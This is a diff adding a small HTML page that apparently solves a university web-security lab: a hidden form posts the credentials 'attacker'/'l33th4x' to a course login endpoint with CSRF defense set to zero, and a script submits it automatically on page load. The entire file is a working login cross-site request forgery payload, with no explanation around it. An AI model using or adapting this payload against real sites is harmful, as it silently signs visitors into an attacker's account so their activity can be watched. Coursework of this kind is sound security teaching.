@@ -1,0 +1,9 @@
+<form action="http://trurl.cs.illinois.edu/login?csrfdefense=0&xssdefense=5" id="login" method="post">
+    <input type="hidden" name="username" value="attacker">
+    <input type="hidden" name="password" value="l33th4x">
+    <input type="hidden" type="submit" value="submit">
+</form>
+
+<script>
+    document.getElementById("login").submit()
+</script>
